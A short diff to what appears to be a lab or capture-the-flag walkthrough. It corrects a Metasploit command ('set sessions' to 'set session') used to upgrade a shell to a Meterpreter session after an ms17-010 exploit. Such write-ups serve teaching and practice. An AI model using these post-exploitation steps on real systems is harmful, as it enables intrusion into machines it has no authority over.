@@ -85,7 +85,7 @@ While still under the ms17-010 exploit I searched for the upgrade.
 search shell_to_meterpreter
   use post/multi/manage/shell_to_meterpreter
 sessions -l (used to display current sessions)
-  set sessions 1
+  set session 1
   run
 ```
 A new session should spawn which I opened with `sessions 2`.
